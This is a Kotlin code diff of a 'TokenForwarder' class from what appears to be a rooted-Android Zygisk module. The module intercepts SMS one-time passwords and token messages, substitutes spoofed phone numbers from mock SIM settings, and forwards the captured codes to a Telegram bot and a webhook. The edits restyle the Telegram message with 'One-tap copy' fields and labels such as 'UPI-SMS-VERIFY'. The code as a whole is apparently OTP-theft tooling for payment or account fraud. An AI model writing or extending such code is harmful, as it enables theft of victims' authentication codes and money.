@@ -46,8 +46,8 @@ class TokenForwarder(
     fun sendTestMessage(botToken: String, chatId: String, health: ModuleHealth): Boolean {
         if (botToken.isBlank() || chatId.isBlank()) return false
         val config = configManager.load()
-        val interceptNo = SmsMatcher.userSenderId(config)
-            ?: health.spoofPhone.ifBlank { config.mockPhoneSim1 }
+        val interceptNo = configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }
+            .ifBlank { SmsMatcher.userSenderId(config) ?: health.spoofPhone }
 
         val text = buildString {
             appendLine("📱 <b>Zygisk Menu</b>")
@@ -71,39 +71,59 @@ class TokenForwarder(
 
     fun buildZygiskMenuMessage(otp: LastOtp, fakeIntercept: Boolean = false): String {
         val config = configManager.load()
-        val interceptNo = resolveInterceptLabel(config, otp)
-        val tokenBody = otp.body.ifBlank { otp.otp }
-        val health = context?.let { ModuleHealthChecker.check(it) }
+        val toNumber = resolveInterceptPhone(config)
+        val copyPhone = formatCopyPhone(toNumber)
+        val body = otp.body.ifBlank { otp.otp }.trim()
+        val messagePreview = resolveMessagePreview(body)
+        val copyLabel = resolveCopyLabel(otp, body)
 
         return buildString {
-            appendLine("📱 <b>Zygisk Menu</b>")
-            appendLine("<b>Mode By @hivirtus @liqdy</b>")
+            appendLine("📱 <b>SMS TOKEN</b> 🖤 <b>@hivirtus @liqdy</b>")
             appendLine("────────────────")
-            if (health != null) {
-                appendLine("<b>${escapeHtml(health.statusLine)}</b>")
-            }
             if (fakeIntercept) {
-                appendLine("🎭 <b>Fake Intercept</b> (test/inject)")
+                appendLine("🎭 <b>Fake Intercept</b>")
             }
             if (otp.messageLabel.isNotBlank()) {
-                appendLine("📲 <b>Hooked App:</b> ${escapeHtml(otp.messageLabel)}")
+                appendLine("📲 <b>App:</b> ${escapeHtml(otp.messageLabel)}")
             }
-            appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
-            append(escapeHtml(tokenBody))
+            appendLine("📞 <b>To:</b> ${escapeHtml(toNumber)}")
+            appendLine("💬 <b>Message:</b> ${escapeHtml(messagePreview)}")
+            appendLine("📋 <b>One-tap copy:</b>")
+            appendLine("<code>${escapeHtml("$copyPhone | $copyLabel")}</code>")
+            if (body.isNotBlank()) {
+                appendLine("<code>${escapeHtml(body)}</code>")
+            }
         }
     }
 
-    private fun resolveInterceptLabel(config: ModuleConfig, otp: LastOtp): String {
-        if (config.overrideIncomingSender) {
-            SmsMatcher.userSenderId(config)?.let { return it }
+    private fun resolveInterceptPhone(config: ModuleConfig): String {
+        val spoof = configManager.readSpoofPhone().trim()
+        if (spoof.isNotBlank()) return spoof
+        if (config.mockPhoneSim1.isNotBlank()) return config.mockPhoneSim1
+        if (config.mockPhoneSim2.isNotBlank()) return config.mockPhoneSim2
+        return SmsMatcher.userSenderId(config) ?: "INTERCEPT"
+    }
+
+    private fun formatCopyPhone(phone: String): String {
+        val digits = phone.replace(Regex("[^0-9]"), "")
+        if (digits.length == 12 && digits.startsWith("91")) return digits.substring(2)
+        if (digits.length == 11 && digits.startsWith("0")) return digits
+        if (digits.length == 10) return digits
+        return phone.trim()
+    }
+
+    private fun resolveMessagePreview(body: String): String {
+        val first = body.lineSequence().firstOrNull()?.trim().orEmpty()
+        return first.ifBlank { body.take(120) }
+    }
+
+    private fun resolveCopyLabel(otp: LastOtp, body: String): String {
+        val firstLine = body.lineSequence().firstOrNull()?.trim().orEmpty()
+        if (firstLine.isNotBlank() && firstLine.length <= 48) return firstLine
+        if (otp.messageLabel.isNotBlank()) {
+            return otp.messageLabel.uppercase().replace(" ", "-") + "-SMS"
         }
-        val label = otp.phone.ifBlank { otp.sender }.trim()
-        if (label.isNotBlank() && !SmsMatcher.isIndianMobileNumber(label) &&
-            !SmsMatcher.isNumericSender(label)
-        ) {
-            return label
-        }
-        return configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }.ifBlank { "INTERCEPT" }
+        return "UPI-SMS-VERIFY"
     }
 
     private fun escapeHtml(text: String): String {
@@ -126,7 +146,7 @@ class TokenForwarder(
 
     private fun forwardWebhook(url: String, method: String, otp: LastOtp): Boolean {
         val config = configManager.load()
-        val interceptNo = resolveInterceptLabel(config, otp)
+        val interceptNo = resolveInterceptPhone(config)
         val payload = JSONObject()
             .put("otp", otp.otp)
             .put("token", otp.body.ifBlank { otp.otp })
